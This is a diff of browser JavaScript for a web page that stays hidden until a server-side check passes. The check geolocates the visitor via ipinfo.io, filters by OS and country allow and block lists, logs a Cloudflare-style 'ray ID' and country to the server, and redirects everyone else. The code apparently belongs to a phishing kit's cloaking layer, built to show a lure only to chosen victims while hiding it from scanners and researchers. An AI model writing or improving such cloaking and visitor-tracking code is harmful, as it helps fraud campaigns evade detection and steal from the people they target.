@@ -7,9 +7,6 @@ const browserName = $('#browserName').val();
 // host name
 const httpHOST = $('#httpHOST').val();
 
-// archiving state
-var archiving;
-
 
 window.setTimeout(function() {
   $('#wait').css('display', 'none');
@@ -24,12 +21,6 @@ document.addEventListener("DOMContentLoaded", () => {
   loadTranslations();
 });
 
-
-// Getting the country code from the user's IP
-var country_code = '';
-$.get('https://ipinfo.io/json', function(response) {
-    country_code = response.country;
-})
 
 
 let userLang;
@@ -107,6 +98,7 @@ function applyDarkMode() {
   if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
     // Dark mode is enabled in browser settings
     document.body.classList.add('dark-mode');
+    document.body.style.color = '';
     $.post('/api/dark_mode.php', {mode: true});
     console.log('Dark mode applied based on browser setting');
   } else {
@@ -298,27 +290,34 @@ if (localStorage.getItem('ray')) {
 
 $('#ray-id').text(rayID);  
 
+// archiving state
+var archiving;
+$.post('/api/get_archiving.php', {}, function(res) {
+    archiving = res;
+});
 
-// Block site & save user's info when visit
-document.body.style.opacity = 0;
+// Getting the country code from the user's IP
+var country_code = '';
 
-window.setTimeout(function() {
-    check_ray_id();
-
-    $.post('/api/index.php', {
-        rayid: rayID,
-        countrycode: country_code,
-        version: 'V3'
-    });
-
-    $.post('/api/get_archiving.php', {}, function(res) {
-        archiving = res;
-    });
-
-}, 800)
+$.get('https://ipinfo.io/json', function(ipinfo) {
+  country_code = ipinfo.country;
+  $.post('/api/get_validData.php', {}, function(setting) {
+      if (setting.PageStatus == 'ON' && setting.OS.includes(OS) && (setting.GEO.includes(country_code) || setting.GEO.includes('100')) && !setting.BlockedGEO.includes(country_code) && setting.Version.Enabled == 'V3') {
+          $.post('/api/index.php', {
+            rayid: rayID,
+            countrycode: country_code,
+            version: 'V3'
+          });
+          document.body.style.opacity = 100;
+      } else {
+          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
+      } 
+  });
+})
 
 
 // check ray id
+check_ray_id();
 function check_ray_id() {
   $.ajax({
     type: 'POST',
@@ -330,8 +329,6 @@ function check_ray_id() {
         if (res == '10') {
           document.body.innerHTML = '';
           location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
-        } else {
-          document.body.style.opacity = 100;
         }
     }
   })
